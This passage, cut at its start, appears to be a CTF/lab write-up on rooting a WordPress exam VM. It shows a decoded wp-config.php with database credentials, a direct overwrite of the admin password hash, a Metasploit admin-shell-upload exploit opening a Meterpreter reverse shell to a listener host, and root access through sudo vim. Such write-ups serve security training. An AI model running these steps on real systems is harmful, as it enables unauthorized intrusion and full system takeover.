IENvbGxhdGUgZG8gYmFuY28gZGUgZGFkb3MuIE7Do28gYWx0ZXJlIGlzc28gc2UgdGl2ZXIgZMO6
dmlkYXMuICovCmRlZmluZSgnREJfQ09MTEFURScsICcnKTsKCi8qKiNAKwogKiBDaGF2ZXMgw7pu
aWNhcyBkZSBhdXRlbnRpY2HDp8OjbyBlIHNhbHRzLgogKgogKiBBbHRlcmUgY2FkYSBjaGF2ZSBw
YXJhIHVtIGZyYXNlIMO6bmljYSEKICogVm9jw6ogcG9kZSBnZXLDoS1sYXMKICogdXNhbmRvIG8g
e0BsaW5rIGh0dHBzOi8vYXBpLndvcmRwcmVzcy5vcmcvc2VjcmV0LWtleS8xLjEvc2FsdC8gV29y
ZFByZXNzLm9yZwogKiBzZWNyZXQta2V5IHNlcnZpY2V9CiAqIFZvY8OqIHBvZGUgYWx0ZXLDoS1s
YXMgYSBxdWFscXVlciBtb21lbnRvIHBhcmEgaW52YWxpZGFyIHF1YWlzcXVlcgogKiBjb29raWVz
IGV4aXN0ZW50ZXMuIElzdG8gaXLDoSBmb3LDp2FyIHRvZG9zIG9zCiAqIHVzdcOhcmlvcyBhIGZh
emVyZW0gbG9naW4gbm92YW1lbnRlLgogKgogKiBAc2luY2UgMi42LjAKICovCmRlZmluZSggJ0FV
VEhfS0VZJywgICAgICAgICAne3JMdDAmLEJoTnFKU0BoMW9oRiNQUkRQNkZ7fUhGYzdYLldLVHFj
R0ZZbGR6cV47UiZnVWwmfnotflNkPGFiJicgKTsNCmRlZmluZSggJ1NFQ1VSRV9BVVRIX0tFWScs
ICAnJDN6X0sjI1dTd2VdTlpHYyNIVH5yYTEyJDBeRi9xdDQgU0xtIXZ3bXNQO2pnPG0tI1V7I0w5
UyZ7LSA6WUtLUycgKTsNCmRlZmluZSggJ0xPR0dFRF9JTl9LRVknLCAgICAnVHhAU0tdazpIQWQq
I0ZKeF1uYFpFc0ExWVNha10lMS5aJD1qKW8rK2I4LkV+d1dJMUtQMGtiaGN+MTleRHg0ZScgKTsN
CmRlZmluZSggJ05PTkNFX0tFWScsICAgICAgICAnYVRGOy9IM2RicT1DKnA+VCMrWShZajB1e105
I19JMWhzOHVDLls3MlZoJS8+Qzd2djB0WUk4VV9nM2w/bTYgeicgKTsNCmRlZmluZSggJ0FVVEhf
U0FMVCcsICAgICAgICAnTSt0MFpkIzwmKW5YeiR2Uzl3Pz9yVUVMQUtWRmdLdiprbGAwW2dqTi1v
LUQ0SCNfZG41IDxTQGEhYz97Xl0yWScgKTsNCmRlZmluZSggJ1NFQ1VSRV9BVVRIX1NBTFQnLCAn
LV1oTiBofW8uJC1IOjt4ZmNAZzh8JT5tX3VYQ2RKJVZQJXlKaCQ/OzFEW2dkZnlXPShMVF9YUTdR
fmBzXk55eCcgKTsNCmRlZmluZSggJ0xPR0dFRF9JTl9TQUxUJywgICAnd1ZkKCNzWUNfclJILn1t
TCNaUSo8IGwpbHA9PUt4WVktViwuOyVsa25vQUBnLTZxNzdLKTR6JU4sdVQsZCQ9ficgKTsNCmRl
ZmluZSggJ05PTkNFX1NBTFQnLCAgICAgICAnbDEydnJldTgrdXZhMDc+SW54Q3pVdXdgdUxMOVln
czlQOyk9Qy9ZdWd1PnNSV3AvaHRBb3EpZ0drIyNKSyw7NScgKTsNCgovKiojQC0qLwoKLyoqCiAq
IFByZWZpeG8gZGEgdGFiZWxhIGRvIGJhbmNvIGRlIGRhZG9zIGRvIFdvcmRQcmVzcy4KICoKICog
Vm9jw6ogcG9kZSB0ZXIgdsOhcmlhcyBpbnN0YWxhw6fDtWVzIGVtIHVtIMO6bmljbyBiYW5jbyBk
ZSBkYWRvcyBzZSB2b2PDqiBkZXIKICogdW0gcHJlZml4byDDum5pY28gcGFyYSBjYWRhIHVtLiBT
b21lbnRlIG7Dum1lcm9zLCBsZXRyYXMgZSBzdWJsaW5oYWRvcyEKICovCiR0YWJsZV9wcmVmaXgg
PSAnd3BfJzsNCgovKioKICogUGFyYSBkZXNlbnZvbHZlZG9yZXM6IE1vZG8gZGUgZGVidWcgZG8g
V29yZFByZXNzLgogKgogKiBBbHRlcmUgaXN0byBwYXJhIHRydWUgcGFyYSBhdGl2YXIgYSBleGli
acOnw6NvIGRlIGF2aXNvcwogKiBkdXJhbnRlIG8gZGVzZW52b2x2aW1lbnRvLiDDiSBhbHRhbWVu
dGUgcmVjb21lbmTDoXZlbCBxdWUgb3MKICogZGVzZW52b2x2ZWRvcmVzIGRlIHBsdWdpbnMgZSB0
ZW1hcyB1c2VtIG8gV1BfREVCVUcKICogZW0gc2V1cyBhbWJpZW50ZXMgZGUgZGVzZW52b2x2aW1l
bnRvLgogKgogKiBQYXJhIGluZm9ybWHDp8O1ZXMgc29icmUgb3V0cmFzIGNvbnN0YW50ZXMgcXVl
IHBvZGVtIHNlciB1dGlsaXphZGFzCiAqIHBhcmEgZGVwdXJhw6fDo28sIHZpc2l0ZSBvIENvZGV4
LgogKgogKiBAbGluayBodHRwczovL2NvZGV4LndvcmRwcmVzcy5vcmcvcHQtYnI6RGVwdXJhJUMz
JUE3JUMzJUEzb19ub19Xb3JkUHJlc3MKICovCmRlZmluZSgnV1BfREVCVUcnLCBmYWxzZSk7Cgov
KiBJc3RvIMOpIHR1ZG8sIHBvZGUgcGFyYXIgZGUgZWRpdGFyISA6KSAqLwoKLyoqIENhbWluaG8g
YWJzb2x1dG8gcGFyYSBvIGRpcmV0w7NyaW8gV29yZFByZXNzLiAqLwppZiAoICFkZWZpbmVkKCdB
QlNQQVRIJykgKQoJZGVmaW5lKCdBQlNQQVRIJywgZGlybmFtZShfX0ZJTEVfXykgLiAnLycpOwoK
LyoqIENvbmZpZ3VyYSBhcyB2YXJpw6F2ZWlzIGUgYXJxdWl2b3MgZG8gV29yZFByZXNzLiAqLwpy
ZXF1aXJlX29uY2UoQUJTUEFUSCAuICd3cC1zZXR0aW5ncy5waHAnKTsK
```

Decoding `wp-config.php`.
```
$ cat wp-config.php | base64 -d

<?php
/**
 * As configurações básicas do WordPress
 *
 * O script de criação wp-config.php usa esse arquivo durante a instalação.
 * Você não precisa usar o site, você pode copiar este arquivo
 * para "wp-config.php" e preencher os valores.
 *
 * Este arquivo contém as seguintes configurações:
 *
 * * Configurações do MySQL
 * * Chaves secretas
 * * Prefixo do banco de dados
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/pt-br:Editando_wp-config.php
 *
 * @package WordPress
 */

// ** Configurações do MySQL - Você pode pegar estas informações com o serviço de hospedagem ** //
/** O nome do banco de dados do WordPress */
define( 'DB_NAME', 'wordpress' );

/** Usuário do banco de dados MySQL */
define( 'DB_USER', 'root' );

/** Senha do banco de dados MySQL */
define( 'DB_PASSWORD', 'MyP4ssw0rd' );

/** Nome do host do MySQL */
define( 'DB_HOST', 'localhost' );

/** Charset do banco de dados a ser usado na criação das tabelas. */
define( 'DB_CHARSET', 'utf8mb4' );

/** O tipo de Collate do banco de dados. Não altere isso se tiver dúvidas. */
define('DB_COLLATE', '');

/**#@+
 * Chaves únicas de autenticação e salts.
 *
 * Altere cada chave para um frase única!
 * Você pode gerá-las
 * usando o {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org
 * secret-key service}
 * Você pode alterá-las a qualquer momento para invalidar quaisquer
 * cookies existentes. Isto irá forçar todos os
 * usuários a fazerem login novamente.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '{rLt0&,BhNqJS@h1ohF#PRDP6F{}HFc7X.WKTqcGFYldzq^;R&gUl&~z-~Sd<ab&' );
define( 'SECURE_AUTH_KEY',  '$3z_K##WSwe]NZGc#HT~ra12$0^F/qt4 SLm!vwmsP;jg<m-#U{#L9S&{- :YKKS' );
define( 'LOGGED_IN_KEY',    'Tx@SK]k:HAd*#FJx]n`ZEsA1YSak]%1.Z$=j)o++b8.E~wWI1KP0kbhc~19^Dx4e' );
define( 'NONCE_KEY',        'aTF;/H3dbq=C*p>T#+Y(Yj0u{]9#_I1hs8uC.[72Vh%/>C7vv0tYI8U_g3l?m6 z' );
define( 'AUTH_SALT',        'M+t0Zd#<&)nXz$vS9w??rUELAKVFgKv*kl`0[gjN-o-D4H#_dn5 <S@a!c?{^]2Y' );
define( 'SECURE_AUTH_SALT', '-]hN h}o.$-H:;xfc@g8|%>m_uXCdJ%VP%yJh$?;1D[gdfyW=(LT_XQ7Q~`s^Nyx' );
define( 'LOGGED_IN_SALT',   'wVd(#sYC_rRH.}mL#ZQ*< l)lp==KxYY-V,.;%lknoA@g-6q77K)4z%N,uT,d$=~' );
define( 'NONCE_SALT',       'l12vreu8+uva07>InxCzUuw`uLL9Ygs9P;)=C/Yugu>sRWp/htAoq)gGk##JK,;5' );

/**#@-*/

/**
 * Prefixo da tabela do banco de dados do WordPress.
 *
 * Você pode ter várias instalações em um único banco de dados se você der
 * um prefixo único para cada um. Somente números, letras e sublinhados!
 */
$table_prefix = 'wp_';

/**
 * Para desenvolvedores: Modo de debug do WordPress.
 *
 * Altere isto para true para ativar a exibição de avisos
 * durante o desenvolvimento. É altamente recomendável que os
 * desenvolvedores de plugins e temas usem o WP_DEBUG
 * em seus ambientes de desenvolvimento.
 *
 * Para informações sobre outras constantes que podem ser utilizadas
 * para depuração, visite o Codex.
 *
 * @link https://codex.wordpress.org/pt-br:Depura%C3%A7%C3%A3o_no_WordPress
 */
define('WP_DEBUG', false);

/* Isto é tudo, pode parar de editar! :) */

/** Caminho absoluto para o diretório WordPress. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Configura as variáveis e arquivos do WordPress. */
require_once(ABSPATH . 'wp-settings.php');
```

PhpMyAdmin Credentials:
* User: **root**
* Pass: **MyP4ssw0rd**

## PhpMyAdmin Access

After logged in, we can find Wordpress users hashes in `wp_users` table.
```
Query: SELECT * FROM `wp_users`
```

Wordpress Credentials:
* User: **shelter**
* Hash: **$P$BlGAWeVt9hVhsIQSB0lny3y/eMLZ8M.**

## Cracking Hash

I tried to crack **shelter**'s password hash, but failed...\
So I changed the **shelter**'s password directly on DB.
```
$ echo -n "password" | md5sum
5f4dcc3b5aa765d61d8327deb882cf99

Query: UPDATE `wp_users` SET `user_pass` = '5f4dcc3b5aa765d61d8327deb882cf99' WHERE `wp_users`.`ID` = 1;
```

Wordpress Credentials:
* User: **shelter**
* Pass: **password**

## Exploitation

```
$ msfconsole

msf6 > use exploit/unix/webapp/wp_admin_shell_upload

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD password
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME shelter
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /wordpress
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 192.168.1.166
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set WPCHECK false

msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options
Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   password         yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.1.166    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /wordpress       yes       The base path to the wordpress application
   USERNAME   shelter          yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.189    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress

msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 192.168.1.189:4444 
[*] Authenticating with WordPress using shelter:password...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wordpress/wp-content/plugins/qMSzlADdQh/mocXMipbGz.php...
[*] Sending stage (39282 bytes) to 192.168.1.166
[+] Deleted mocXMipbGz.php
[+] Deleted qMSzlADdQh.php
[+] Deleted ../qMSzlADdQh
[*] Meterpreter session 1 opened (192.168.1.189:4444 -> 192.168.1.166:48610) at 2021-04-09 16:22:28 -0300

meterpreter > sysinfo
Computer    : nac
OS          : Linux nac 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64
Meterpreter : php/linux
```

```
meterpreter > shell
python -c 'import pty;pty.spawn("/bin/bash")'

www-data@nac:$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Flag #1 - User

```
www-data@nac:/home/mnt$ cat user.txt

Se voce chegou ate aqui eh pq ja conseguiu 65% da nota da prova. 
Parabens!

Ahh.. aqui vai uma dica:

ls -la

Onde? Descuba... ;)
```

## Privilege Escalation - fiap

```
www-data@nac:/home/mnt$ cat .lembrete_fiap
Lembrar de mudar a senha do usuario fiap:123456

www-data@nac:/home/mnt$ su fiap
Password: 123456

fiap@nac:~$ id
uid=1001(fiap) gid=1001(fiap) grupos=1001(fiap)
```

## Privilege Escalation - Root

The `fiap` user is able to run `/usr/bin/vim` as superuser without `root` password.
```
fiap@nac:~$ sudo -l

Entradas padrões correspondentes a fiap em nac:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Usuário fiap pode executar os seguintes comandos em nac:
    (root) NOPASSWD: /usr/bin/vim
```

Using GTFOBins (https://gtfobins.github.io/gtfobins/vim/#sudo)
```
fiap@nac:$ sudo vim -c ':!/bin/sh'

# id
uid=0(root) gid=0(root) grupos=0(root)
```

## Flag #2 - Root

```
# cat /root/root.txt
s2awk8fe**********************
```
